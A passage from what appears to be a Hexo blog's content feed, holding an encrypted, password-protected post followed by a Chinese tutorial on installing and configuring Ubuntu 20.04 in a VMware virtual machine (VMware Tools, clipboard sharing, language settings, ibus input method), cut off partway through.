eb1756f8ec10dc69d2edcff7d6f66b9f9031f5e3a73954942fc2e2c8e7e92fd58676f9bf548bc7e6443a3cbffe18107eedae239f5768d465ca5696e21528b5590bed3cb88ca6839de7d385677f256b0a81a20874a2d92060e241ea0a3503205570afcfbf0b8dad0459e8b65ce26fb1cbc7a356d11fe45682a9a54adce1a7cf8a843c2a4a18511f424783cd9b95303172a6af3fb0c3ffb0521708595a4e122039f8f28be11066ee7bd4688e6dfd0ee4305d7e922c64739249a38ec7f192cc46ce2a5dbab7f208e1b613181ec5329b203054d35c2795bbbc83ed4a45d513182e6345b11f1dc21b16cbad0d0115f6ae7b72e8bf06faf1cfe0e9c9d90615877a1b01a8854677e91a9207b1bb74e672940a159e58889adc1b89428587602e3858b5a3713054fe1a3070e44b25d0ceec747a4ea6d3c27b0124c4ccdedc9cde3ff809df56dd6be2f7415512927e8f4a3e80ea06240fc68f63668c3c5f05bd86d278c9e352ca3cc04fe7d5846bc6518c1e99754344acc60b69920bc23aece35021bbdf321e69c752302ff7595069e0a4b7af9ce3983a50d5c88cb0af455c5dff4c1cfd95e7cd36a281d6bac93faafe0b72f1f7d6fd0292ce7adacce68dac5dab054bf3d3ad98bc5f9a2506574cbf74740a1ffc632220122b29c61b2e08303ca71f6ab6c1449ee9f0a3d28d07a38985c9eb7d8b9de65c66253ae4e3c98f3d22b66f1be8746958f71f4723834108ec09eb9fc159f4937abb58883e22675e79f8451e437150022392287b12c43ca9ec942adf688ce329ed1b77475e770bccc2da8ee5961fd686787650848132d5c7b1bb41cd87dd7d5208cafcd3d0cb637aab331e177b13c306c65b3118432a5cb983f81c1b768e8b2965f9b98c18fdbb95444637021e60b6640639d10d4bc14f97f2208be60317e7c7370d0778bc5234c4a077bbbb1d211f4fafd7c49ed2c3503f9e298601106978b7a9472e9950020d94d83374948adf867bddc9e48621486003d472dd72fbd31abb40356e5a254275a7b79fac53a8abf37360973629386e974f34eefd301e577f44673c1b320b06b60c2e0e423bd1f69477288b5a9f86fb7abb866142f0fd2213b7e5c9f2336f1dcd7ade2615d253124e7c83e0cb236fbee7011e9d80df500a6dcfe37fb3ffa8827ccc083161d2feb6e8a858fbef7ff8f24c4311fedc1d37ec445779dfd294d95b18df16e42717ac17bb4cbbe515597273ab64067c271364582f7d512f5b6639d1a640a06857bf8f519450a8dd4616dfa3faa1c99ea679b0298049cfa133761230d6fb3180f3131686f5ed2cf18fb09947aa43a62de94028add1ed75e46818e1572a8bf2a942b9dc7489e0ba8cca0802f75d21fa86ffcb4c2469d03e8b9cb923e9fb22968251a1ba4a9defe0d16edb067c29542f656d0b597059d1ee2b43d791bd1923b59a78a61d5a9d8935cee5c0c2989e3ebbeb61f4ecc7c120ac9099c6f2bbf68cd1257f1d0c630591d10225516955859f10de3eb946221c4fb12438a17d94499f79f7021d10d37aaa8f278fadfdfb432f4fc1d34caa59514ca7d942a658fbff05b5ccd1f60b6f2af4adb33c332665aff80365497882e90e546b94f60f456ec71ecde3ce43746577e4d76eeb42def0389f7d0d14403a02ea1991eb8a71ccd9445a642246938be85655ac01f41807e4b85ab28314d6f34a93f915f77c07032edb5a89113cfd9d252c931dfa0abd6a5196d69b6e9ce4d90637316b581c268cd4d180ea141ab9100a3c37835d5205dc090da643674f2c7cfbd04ceb97ea902d03233918fc79a9d36ef6433d35cf581575d6a0e6db28639717449cd7c38ad656b2372d13b1c07b0f10d15cf4d129a75fd3ee0510e3c932467da00f3b0ed4f9bbea8834956a2e745c6ced5b541e255c8c9311b5a808322d853d379dc6cf28579df53552f3b067b7a43cff0aebf087c2c494749bc7f2a8dbd131824a7bd3a8f0919e03b9cf89112c6da0fcab8fe340c643a5562f69f69ec9bdb8ed6fff3e280b24872e1baa003a6a3f21be0295e0a560ad9a012cbefeebbbb18ca0d439ab72218d03e6bd63f3a816cada50e10e389aadd516f2202e3555cc1a77c2959734cee24bf0c8ef30c0766930b8a0645907413168061e35ef7bc3c4233cc20c63a97c629eab4fc791512647c74a568d6e62dffb009121f21483c670156b2870e18b9632eea6f750afb26e6bbeed7dd5f4485635680224d2df64aa59e106f4ff67a6652765b1900a7f507ee8c769e63a012c17b9746a897893aa372ff3d6c113a64f56c2776c8b559bce05840702b2ca7ec67a5eb2e5bea5f4f25381fc711b0f8b56e8b987ecf5753c80c6e047e334dd9cf281839a77fd1596043c928b1fe743ab5629236a243bf27951b9d1a2658d196b53f06b806ff94c5d2c8906b3ecebfb8f446f838329b162542585eff68e46646211dd73d4234671e8caf3b9936ff8ee1254c2daa705914b6ed16976667c10f5c92d532d1bb4814a189a87f275da81a8b2d609765a35eb07f59019122ac96a1a0c03196bb4d3a008337534e342f57515195eeabf9a11e3b3fe959e0099fd361139c800547d39cc7d07d71edd6ec67d1f2ea262a99bedc76ff3074b65f784a6adc96d3033c61f03e1b11b967ba508ff2f793aa56ed4ecfdebdec93c6b7e26a4f7cf9ea9c03e51d9deafdc8fb4e8cfed4e8d066826f3bef7a72d8daae70c1a34e9954c58ddcaac1e5384f91c2fc3448a58d7b156f8b0f49d79b9e0231894ee50bf0810a1a8e624c00a4c73c3d11ed0bf3ada46d35a1f2988b6c81ededd6fc5f36330a8f6169f4eaee6cb49026eeb9f9b39b1b23d7e07aafe40b85b91badfea451d58704eb9e7d31fe43e4c3bdc408623fc9517da2b25b7e5836318c3b572ceaeeb212a2f2fbf3e760fd655529a785f9d31270cb6e656df4fb8fd4ed29f085ecbbe093898bd540e79ffff4104db13779603b56befd31619b3279af5c3c638e3c4783ac9ea503a07db4195873ea9d1e1dd736ce2c9a545c6af54910614627879b131293103b7a6484b12a17282fa2730fdbb7f11da9338fcbc4a6a165844bfc839f37d566b7813c7c113366edb78a299663c677d07c879c17b586ae8961de2df73b9e77c3bf3b1a3c2c012edf7d5bceec613c65ed2c5a65e04939d507451551dad8becdd1d6c5b6f740982ced812dea1db73d2f4308a8d8aebb015cbda1ddebae644fb21b0ebf0c54e9002e4fb26023cf297ef962f24a235bb07698c2df6724ac5f48fef35d921bc68fd042e744ec04796a9a18e22bc7956771ba8b26662becb913bc95503a43eec7d1bcd014f62b95980e1f27fd7259d85f4a6cb752b0f13803be1646848ac3dbe544bb676f999f416dbe0ee13896d7c590bb03595b939193c239d49e351f6ec4abcb910e598995407467f716344b54edf57b76422921e69e4c68ff6a1095bfec1cabc5867a0b5d79e44e6fb2ecd3889d7e5d567a039d61f4b5474c2f3f5142d28637eda9e0b317eaf7b7d8320ae0a017b3a1b68dd47ff0285ed73d6817291f542064bdc2e603d4385edf7eca97e25a4b99c3ec8ceac624c64ace8726239f88f83fbd6d1a35940ac71189321b5c305f1c43247ffa1b18a400a41846e645b5b7f406757ab7aa2484af661250c7749b9d6ebbaf2abb12424187f00da9fd108a0eaffb18006a7abcb013b544558489f67f7cf6ce72a3c101e9c3d5c947caefccaf144b8893d71607503bd11ababe9ddbf1a09486ba319d974242bef2a8eca662cd11f33621afb429e7c4f10f0b3bfe1988893190b02036728c3cc9298b074164e040a6ca5563d34d6c242c76ce52728eef5916d5c7389700cb20c8da0aa0e0a68467569fd7947ae51af790522526d3bd1efba6fcb4a1424b96e053037c732958f1c71047aae74f6da5e9e978a0ed3f8d26e3c5b9630933a049f4cd88d3f70825d4e370061f387a6efbf6fb13db8bc7e5d09c3d2708355eb2a67ba381d999e2fdd379ad4f016d76776c9869dda938fa5fb084e3347405fd6fd437fb4ed0bc125b8bc412fdb6a5eba183e65cddf6a9e2f98c83657e3e20ffdfa6da471417f887eadcf776a6bd17f08a732d256b0211b1388b40204070116c705544f5883d9d92e56cb2f67ebc67c4738a172953463c22ddda8040cb2db77df86f3115ee00a134382cc8c509de519093b3c9df2462d9088ca5575097ee186be4c5ba9c24c05559186a849593d701e786715908fc1f925cfdd3bc82d35b6a2f0ee8488b3fe11436bd634d49b5630388f43249937270dc2ae793b39e118608c1a29add1a0d8890177c9fda71f593d6d83a9ac2851bca8457c670e7e6833ad564515b6472f7374293a8e8967b0e132b70ae2aa6995c0f2e03ef1faffece77d00dd9b498a30fb7962ddf04ca6a37af7f9fb9367e516a56a2fd7f1d879d804f3e6a942487bb49eb0f03ad89b9f548e9777edf095659c4e11462ead7f633ab0dbae8f5f92058ff60215098d031fd1beec1e746285e7335cc5719ba3f4203288befab07e5b3484761b055770d773d2679a54c28383ac4386b0768ad20da0ac9ec3bc7e481c0d02b677548116ebfe21828bcd0141780277dbaae1517ee3f7ea1ba04b490c23feb78dde9fe84e23a70807d544b485e430d512408f71ca0f130640e71fd917cb8b36c5a58dd87f66b322d02213545c8c3f559c677ea2ca273a65584d998a1f77fb0dcb3b5d9caae366c4e7ad9d3f7b042785f7d01f55e9f5483eeeb6166d7a666100056584535136bc717e5829ff8a65596c18c01ffa4d7b958e9e226cc6a45b2d27e6c247021bcebf94381d34246e5ab57b50e636d533e89102a679c7a3d24fdae6509f93126317f250ee1c230e63547267a28a54d4a555479d9555e8808fbe32c30e0872c953b723151f4b08850a3aa8773f681e02df624bfcb8dfdc3e6f2f64b05bc75c5b3eae8c8c229d40f8dfa0f9b7a6771531a73de24040ae897d7db9bee4ef1e64da2d1effadf30b72e5ac2a572f634a0b715823757399be4bad030ceca2879522e5bbfc3c0e2c6c82de9fe840d420965cc36868d77dc32c3adc7c121dfba9437eb9bf34ee33373e8edb8ec76e8ddad04ab22cedf188c7349cfc11607ae370f9e64000cba51699a4d7076e8bcfe84ebd19071b3b93f0f5553347adb4f1961de79d6ccd1e86c356ef2b2a62ee5a626f34bce834e9c9e4f3043df76fd5c3840595c40951d2d8cf43a2015cae423085c88d57d28a0b65022331663e332a01d2e9f9c1b7f2f57eb30f38cbde285c87692c562cf32a21e688ed133a005cb2af8f21509031ad423b67d97e75f0ea278962a47f4d382a2b86d27837dac0d21492d76d303c7a4ce76f544f7bf9f33c2f30f133f74212ad96b978487abc5ff6c1d739211c7780cc2193fed4d6e74628be1e2262b3edd22cb139924f45fcbf4608654231f4bb122ce144481ad0238c5285b81dd18a661e6e8703006fbc4b22faff4dab57ba465e68907b5d60edfc4bc347337ec9de4731a83b160f57de58901b177c616296109bf19702c1d3c7411d98a9bfbfc2cb55d2a374ad6bb63fba5998903a069a4be6eca6742b0788eb6eff5033d8485f48349f4183625954d7955c6817064cc122f30a18901a27a71e130dd3d14014b988957899c11ea7f41cffc462b20251f0f16e5159695061c729fb49c30ee0068e3858c861682f04ac63645be87e1447127af476664707e655ab875095bc5a6f5df49b4db2303ce22c62826a24467200489e1fb6f59644b50ab528fbe5912ccc0a2106bc5a66d499fccbb537db077d451066b4b264d535def7de910398243afd55835ad79314c5cc3966eec4cbb74e98611b7b0b362f078c732b184f18fca2a5bb1329e4c3010c88d3c02c1e34f8e86aa5bf4b02e75c8f3cc62818ac42781b22aeccd98ed0137c9ee7d6c8d16a8bdaad800910f4d9369341d69f848e1eed6db1ca693b126e355fb54da8c02ab7aa715bed60e1e8c23e0eea07cdd3b7621aab6eb9acad7f51e2954d37518927d94a1bdaa05a8acef4ce96afa06ca9447cfab8102be04825ba79945fc3f71ae8325fc1e7f3e3a7890a09b4c51e397ac9d6269c92a3d88c4a627673631f81b5e96b1b52b11f5113028151ffcc1cacaee2201ceb4ccd28d695434d7f348dc07577307e5f40a1b609c9d943cdcc8acbf917a27fd6e3c494e07b4b6bd021e70faa322b1ffcdd82b471ffb1cb95360514634ec360b224e0d3feb1d813fe94c4e33b1e08d89bb55d71fb794bd76b8e4a5dc2620dd4da905a94cbc6d9a26702493ef3225727256096d60748c0bbc0428095a0b1c0a2e1b8857ba85386b919d9b9943c5112fa27b17d33a1b0c74cf4f8dd96bff11b8a0b0e7a1b4255f60804f76833dbafa6ecbd786cfcc2d25078688ee7792f17bcd7bf1feda817affbb8c41a52e4e090f53364b2a2ee3488692e48dc177d8cb7202c7455268d0e18aa20b332f5f1345ffc8973bdad0d0643766d80116ab03d0e76925a3e46d1de44505bb3047f600693a6fcbfe33127fe126d0dfa88900510a64afa5251aeb656271df1371fd2551acdb4a8952be5a7311afac30ec6a68d84b4bf0053a71d34b3dcbc218aca38974925f8c37dae2db3e9dc4f2deedbd5b3f457cb53c02b11130d360ed1289ddc1a9a0602d8f921be0537e03605897407f2d785ae3d3ba9782a4ac7859c0fdf1f58b6a2dd2d4bdda7399f5f7cac3505a074d18cd3250d6cfa0e853a793f35137ebb93e6a0eabf7f33947787c1c3fb6427443770794bcc7dae103649e74a4fe90520cd4287e48a448f2546f18f0a913a895c7418ff0623bb336642ae843617b8c68f47e93d5bdb222c31a038086d1d6be5223f37d4440e294ef105384a8271393389034b0d6e90d1a1eab6b5c92ab9ef79b5cde1658a7ea47ef8ad6bfbd04da70fb4c1bb91361e8ae86f5bc58d8ba3ed2c894079aa61563c3a9947b4d037c4708806e03704218468f210c6a122c46a7c6519eb74ec306312610197cd58578d34ffdfaedf139e979b815b18f92e36824484b048a42de32e55fd16ed696bc862841433a07bd26f3256013a8c68bb91d9d9a359cefa549e4d920ce5b33ad904c11a89b2e347ca3b1042bdc2bf9b0bee671da85ba536f651bf019249a5284fc83b808ae843644d3c502a3e18fff1a94ccd010f0155a0a2a86a7a92546605e480152364172107c88ec08ee223ef31f4bc67912a55c14c2214f7fb918908af17901051239bb18c4e5084a952f9ee75c5093c12874aace75af9292528eb956486415897431156f98a1ad7a0acbb6723fb6aa32cf619c6ac777fa40c73ce506e674580bf25d032f3065a01486d3ee52292b2a1bb52869a4175288b63b84fd1d8c81fb07e61673b0226c09dc207420fab4888c99a517769dbf88f84f97ec971b9861ecf7de0d1d2c2276ab2e4df582381c78f59252618ec8042aad783726a7ba9e5aaa981e98d857ec7dde2e01fafa9a7dda0d59ac06e9c06daadcbdbdac73c990ec523292c356e80f28b9c032f4a66a1e11264247d7d5ee4f290892c959a6db59e3d351bbafc88de47f5ebb21d1136fd67fe24aba8a703fb911bda732a81c1ab14e437958bfcf333692ac2238f2351ce6ee21633320f2dd9bcad7073e119e11dee6a4ddb867278bb92d7f674745dfa4507857a3e00f1fd35a6c1aba257f799badc1e1e54adb78160eb58ad23493f1a3584e6c4319510945ccda3cdfdf392e7cabe7592f66876a57d7fcf5d11e07686ee06b810d2c47fbe97d74464ff5d4bf40078786de4afbc302a6ad652d7112639940db4324b80f1ee0687b19ffedb3163dff72b6c8e28655f177fe2df47a78ea236c389337c56d07a138d1a4e7d734f44a441fbb602e868cb2faa56cc589660d07e4a01f9d230227644f07ee9144d0959df876ace5c2ae73fe4c27fb25c07cc2f015431d67adca000b9515fd54cded35cfa45fd1aba22b0e30625f34449511de7d33c163eb12a25079677706c745dc91c5558d3f8c71f97fd5474cff0fdfa64675f8171733cac7084b35e13e3c9089947f0010653db4500033a69340f1b4e7d6bf43fc55ec004100bfe22f194a45fd2372461cbc71c604b1d0fad140572fb9ed8f08c118e6280b882fb816349cf18b1883af95f2a4aa9f06263b88700fc6767cfabf71e233ab63fd0c1cc0d6df988fb37e1b4bf14b677bff1da4443a196c66aac840c5f219f577f8755f4f2cd7590d0c563a6928924ef8b2153125fbc91600f6a943d3abb72b8d6040edcb644ccc12ce0b9a348511e7ac5126ae03a9d529854f30f1b116a7192031cf35e8493c85a1ddad73ed78e99a782d122f26924e7ea630545ffd386f1c218db18826e473e93ccf3802d0733077da87e5ef88613f54b8f5758ebfc012268b353f913dbea322ae1403cfacf43f82aed5390d2623de2a7a3144f443aff470488772beb792671d8118df19d52864e16ff38b63047bb59d7e7ad59ea4ab84f9b60ccba3c643168c142ab29577ef3cc7708908b436aab129aa0815f9c06b07d13751b4379a9ddc37820fb1a83a44cf2f60871bc2a32bd788df280db2b80b276c01bf87fc34a9fe638164085a2aabacedb325d3bfb1e8faed103ed4feae3da0d91227de5fcf1842b494b9edaa68f39b036fd78a5552148943c46da958dfa8adca247a6c73b7832d083364aeec225ca6d64223c6d92f6a513db818025d8b4d691a6638d45e9b4bc46cb53ed3b33feb6ed4c47f79c26a2101c980f6899abc9c4b2838f73ab2ba9654a43b36a7985a21f2be0720a5138311c930e34f93e9ef09a8869f7d1b0115686b91d2cf0432fdbb59d7a6e6640dafd093d1306aa746a5df2bcb63d1c8d1f219e5d9f2f5da9e75aee414ababac66d487fb240adfc0355395ffe5df99560a826c06729ec08d6cb8cc6dd656017b37232327285b6c4bf5d201f40bdf02d1b7076852a983b43ca50ebc0aa74f74caa8726b630525b184d41b37f6dd951a8e39e7ce41a9c7ec30a466d86adc0a2e6aef4e8e6db8dde48a014192bbd494a4789f6a853de3f52db3d03a2f64eae9e7cb9c2989932c48bf35dc253ea55ee733d9e5c3d9da7925f5117e6af12066adea4ad1d5cfa90af8ca6674e32ca82b2e268fb58a0a712db823e0fd4066d8dabe64f42152ccfce681e95f5e4bb3f21dc22b6183a71311953d9bead18b1024c1f0180d795afebf6bd3169464161fb4b46e84f06f301a733d5061c79c489501718b0c3f8daa64a3f56a7dbcf9c0c4c80d5e982f5b011688ac220ebd98f40d682139a7d2619bcf6cfa39c775e50da967f73eae8f1ae81dd3ceeb387a6cf89f028be4f90265bf617356a814c63ae4f808cba5b9a3e6fae9c18e7addd5dcea51df62f6ee62214d9110daec7d220a1d8f56691d2954342220a1b1ba7016a4b6d04f379c28275ec550ec20e8dfa1cb0a88180437d81aa11207ba7be6872d54f7d67913ac7cb054dcbfe0ef991c72269a8580878f719f768023a5a116f48f0a832537781e58314ee9ec63abdbba56b62a930eed559b67069b8b545318e6e5caa386646211d915a17d825f10121c4fafda3a988766f233b40ea332f391d576c6d1202e1667809dbb693d1b142adafcc7fd4da8e5e3d01f38264ab9e70228d2a5765775d02b5940d418af09563b229f5a5e81b21d597778774190504f0ce39e2d17af736ddb1a641c461ffd824545810a1226bfbdc6e8dd8a7e25514283b8f8aa8da0ae2c05f3e689f8c773b48ed00208fb0d753354649efd0c4f0d1303e0c01257f03bd871c807a2a3fae030d2da1bccf2a1df6365836ce8fa80ff4c21132408129c13a6d63598bd04e4dd326c5965ca505065d47de7631a7dae794dbaa6c27116acaae9a7c95fd0c501b1ddad2354135b3ac7f7acf7e719108f5e3c218395536af2f8b6e0b46995d4d34ca487f6cb11feda93eea0c0d4d244284e61df67bd3031c6169d0895847764a5173a7be35de0ccccfecb39389c7ac1be8dc39baa87e92f45c3ac79ab9e0b5a34c10c07aa84912958b848536f8bfd7b6945f7fb849b75312332721d4fade47301087de51c2ea27223206acbc3f7478d711c0cd31bd8f6ebf6c65b82f58d74876091a995e135d50cc71e43e292665ffba15dfe016fb1da62d90d071aaf3597e966c8a5f966d791a583e7ba3784796d1f45365ebe8322c335e7938df092fe12354d3ca76a035251c5ed36d18daa7f2c0f45907cfe487f64bc4bcddc652a7eaf118349eddca312f7905ea876703a10ec169256dbe6898d875d97f12316cd9e37ba6aca53defd56e4ba83981eb529b6b1a018e0e435f43d1f852e9c1318dcb1230a59b0a8223d93918bdb6d9d81081f6f0909312d665a0cf0d67486d4445a9f28a6ab28e6738b7111e069c79f6d7a2b366a45f1bdc7163d1a37f7096ed4a768aad126980fd79e336cd0afc827d5ea53d862453be48c27f8cef7e41538f62bc692ea5a40e9bacfcd7564e09c4b6eb053168e518d4db399ec75ea4c4de2b82fee8bcfa965901d1cb68006e4fd60f5401aeb2465bf8c09aaa49c50766675ac2c1c204cff8c34bd335b3f7552941c03dd7b34f636784a63dbfba1b625d7471c0be11edfca8078c105fb1dacf9575648eb950bde5b495ba5c67394d9573ddb018d1a66ccff4e5ab49f3cefa3f7e44ad08cb18c175798b23afdc7b0688c3171d9aeede1770298f4bdeed94bf1a19f97f0606503ea0d3afcfd3a141b7bfc32cb3d8bb7ee354900b9de3aa3e7036e1b4553cb38adf8d933374fc976f386bc9fdaa9ae0ea12409d3ba4a7bf7ebff566aa3449e72946b2b125c7a0a61e1ab3f61e1d2a55601c05d1069d04def99d631a1de681c2d4373911dabb9422d7d9d612c3f6a9d9921d3bdf11651bc1fb8836559668b588491d0c9206f843f0bd6c8d95365e8f231e6e6b214778035135a0f4878842e534e6bf2a7e0acb87271669c3a3c8df5c9e43e6634e7841631ba8f171dc051de27252433f22e9f6e6a537fcb79c0352f98a8f4e28caf6d0084efe25bd54f32cc00c365a73678c3703ac25448b92a8abdc99bd2908040c676cbe5b096b8c89abc12b31bb6222c41afeddf05ec2b15d821b31c27e37961ff392fbe6447f97636a3fde0a739023c60fc288eb45a37324802df92796cb474ea7ed36a1bae819a54b14e71bef50435cd7d773fe6fbd5c3333cde6ddae3912792e454b886dd30cc16d6d42ebc51e39b281fcb8a295a2134035da9f2ffe4ad3a274a71e690c05edfc6dab25533861811a38e913740321ed893d435b62c9df899e1c93243cffd0f07058984ae0ab76d4bcbcd538b17d6fed4a692cbf99320a130b624da04c6af5950ccd3383f2a56a1e0a89ac8f77c808cfb847ca028b42340a624136e043bd8dff48bb651356b2bd121b78e665ebd8650ce7ddee83e44ffae35c480fbdb33f343bcafdb1e8baf9ef87af92442348483fbac2517bea1c1f1d98507e0d2efd6814e0ca0ad7d339d1ef6a44a34f92f050a30b6cea43abe7f2135c1fc90803bf956056a236a508848456c8d2931714721997f15fe1a7f11e95db6fc2668acd456e2aff82a27a022de29f5ce3a92af34a546c075007f9f672aea83edb49bf70d966fe460ce40cf9307bc1570ec451eb87278d676691d9e5aa34b200213217f2303d7573263278680b4e5e8a35066a5e40c22d7173bf0439793a0e96a556c31aba31270d4ea17bceb40f0445daee51cd2455c695322f48eb2679076f0b6e4a150bd8aac5951a2c3d9119cefb2e548e8ffb522c7f0a6cfb59314830fa767d3849c19bedb0377ed05e6b6df9ff66534e61683e5abb73dc6031f305750fadd3ed275566acb1474595c6bef308eb1a517c623d5923ef2be278eb5fa1a93ebc3a00c22eca734f4e51d8ca0ab9ec5ccd1fc120185883c8b6d9ba0334eb1d2f117c6989353c7c0e3cb8a6d7dd4b00f08c76b0181238041340d95ecdf30c0b59f8b7ff713219715e7b371e4c2f1df563f54304c378ff10620a4342c7c43a237e44d14d95fc9548b713ccf3c4aefd35d2b1b8cfc980683172ce7f73eeeb9cd3f4e38385ad8c897d288c973f0b8701325c3163e34f6469e888636520700efdccea824b9062517f803e650c6f9621489d21a87028b78db1d1c4345a74e67528f540193976a2c36cfddc14c1bfb0a5a42d1c853f18e4f920a3e494750d2a8df73d490e8c49730263019025fc43abc0d7c4f01600cb3425a59a7d7b0485e378cd65e309c13771c0cb41e1ed827a68ab2fff74d21d7a6943dce9592a1bf54c1e04a9c7df763e65add9086e90ed8b1fe367d2c9514a1058b7f47feed7ddbdc1a98ad883b3ce79791d7a8c80623bb8543f747cceeabe2ee9ea53d6a99199d286a1cca29a5ee33b13b0f90d44bd854687c579c3ebb113f08433fea73ecd4f788af089ac4cfb8c7eb70faa3c6dc6ebf193159508c3ca547ee807e6da55a7195a465105c0512f7243efe9a53bf19bd98f3f494eb87c118160cde20ab3086190e1b1d69b716376af7846a370024197d7391424ca9b7c2bcaa6fd17a43f29dc13ca88ca0b932b41bfded84c807faee0cab178f01d9c655a8c5ca2f28466647463cbda0a2f0b026be717bc46a423d66990d3adf5a620ce060617226c2e59492c9dfa668bfe5d258187c7a7fb103e45494e6d8341aa7635ebb7695a9f241338d007c7d81c88cc30d93eeb002dcf5fba4d4f73ea850ca7b60fdc5cf3c3c8ab42961</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 闲聊随写 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机 Ubuntu 安装与配置</title>
      <link href="/posts/3287931156/"/>
      <url>/posts/3287931156/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文以 Ubuntu20.04 为例</p><p>实力作死，把 Ubuntu 虚拟机玩坏了，反正没什么重要东西在里面，遂决定重装<s>当做复习</s>。</p><hr><h2 id="省略步骤">省略步骤</h2><ul><li>虚拟机/实体设备的准备【本文采用 VMware 虚拟机】</li><li>对应系统镜像的下载</li><li>虚拟机磁盘创建与镜像挂载 或 储存介质与物理机开机启动</li></ul><h2 id="系统安装">系统安装</h2><p>由于该版本在虚拟机中有时出现分辨率不适配的问题，安装过程中窗口显示不全，可使用<code>Ctrl+Alt+T</code>打开终端输入命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xrandr -s 1280x800</span><br></pre></td></tr></table></figure><p>然后按 Enter，暂时改变虚拟机的显示分辨率。</p><p>挂载磁盘后启动，等待安装程序加载与检查。</p><p>将语言、键盘设置为中文，然后一路 Continue。在<code>安装类型</code>中<code>您希望先安装哪些应用</code>一项，若作为做学习研发使用，请选择最小化安装（第二项）；若用作办公、冲浪、游戏等使用请选择第一项。</p><p>之后一路默认选项并确认（磁盘那里选择第一项，继续后在弹窗中确认修改磁盘）。在选择地区处选择中国<code>Shanghai</code>并继续。之后设置用户名与密码，点击<code>继续</code>等待安装（时间比较久），结束后重启系统。</p><p>至此 Ubuntu20.04 系统安装完成。</p><h2 id="安装完后">安装完后</h2><p>建议使用 root 权限执行，成功率高一些。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><h3 id="【虚拟机】安装-VMware-Tools">【虚拟机】安装 VMware Tools</h3><p>挂载 CD 后在虚拟机选项中选择，重新安装 VMware Tools。在 Ubuntu 中打开 VMware Tools，将 VMware Tools 压缩包（后缀为<code>.tar.gz</code>）复制到主目录并右键<code>提取到此处</code>。</p><p>进入提取后的文件夹（找到与<code>vmware-install.pl</code>同级目录），打开终端，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure><p>一路回车，全部<code>yes</code>，等待安装完成，最后终端出现<code>Enjoy</code>、<code>VMware Team</code>等字样则表明安装成功。结束后最好重启一下 Ubuntu。</p><h3 id="剪切板">剪切板</h3><p>安装虚拟机增强工具包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>之后重启虚拟机。</p><p>在 VMware Workstation 软件中进入<code>虚拟机</code> -&gt; <code>设置</code> -&gt; <code>选项</code> -&gt; <code>客户机隔离</code>，将条目勾选（我的已自动勾选）。</p><p>注：Ubuntu 的复制粘贴快捷键比 Windows 的多一个<code>shift</code>键</p><h3 id="换源">换源</h3><p><a href="/posts/966087953/">Linux 更新软件源</a></p><h3 id="切换语言">切换语言</h3><p>如果你在安装时选择了简体中文以外的语言，可以按照此条进行修改。</p><p>如果你使用的是 Gnome 桌面（一般安装 Ubuntu 系统时默认的便是），可从左下角<code>Applications</code>（有几个点的那个图标）或右上角下拉选项<code>▼</code> -&gt; <code>Settings</code> -&gt; <code>Region &amp; Language</code> -&gt; <code>Manage Installed Languages</code> 进入管理下载语言包界面，点击<code>Install</code>安装语言包支持。</p><p>进入安装界面，在<code>Language Support</code>窗口中进入<code>Language</code> -&gt; <code>Install/Remote Languages</code>，在<code>Installed Languages</code>窗口找到<code>Chinese(Simplified)</code>并将后面的<code>Installed</code>方框选上，点击窗口下方的<code>Apply</code>，等待下载。</p><p>回到<code>Language Support</code>窗口，将下载的<code>Chinese(Simplified)</code>拖到最上方。回到<code>Region &amp; Language</code>，将<code>Language</code>和<code>Formates</code>修改为<code>汉语</code>和<code>中国</code>并重启系统，配置生效。</p><p>此时系统的 Home 文件夹的目录会变成中文，从而导致输入目录时不方便，可通过以下方式将目录更改回英文。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LANG=en_US # 更改系统语言环境为英文</span><br><span class="line">xdg-user-dirs-gtk-update</span><br></pre></td></tr></table></figure><p>同理，恢复中文：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export LANG=zh_CN.UTF-8  </span><br><span class="line">xdg-user-dirs-gtk-update</span><br></pre></td></tr></table></figure><h3 id="安装-ibus-中文输入法">安装 ibus 中文输入法</h3><blockquote><p>建议先配置完简体中文再进行此条</p></blockquote><blockquote><p>IBus 全称 Intelligent Input Bus，项目现托管于 Google Code - <a href="https://code.google.com/p/ibus/" rel="external nofollow noreferrer">https://code.google.com/p/ibus/</a>。此项目包含了世界多数语言的文字输入需求——由世界多个国家开发者维护。</p></blockquote><p>安装 ibus 框架：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ibus ibus-clutter ibus-gtk ibus-gtk3 ibus-qt4</span><br></pre></td></tr></table></figure><p>启用 ibus 框架</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config -s ibus</span><br></pre></td></tr></table></figure><p>安装输入法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 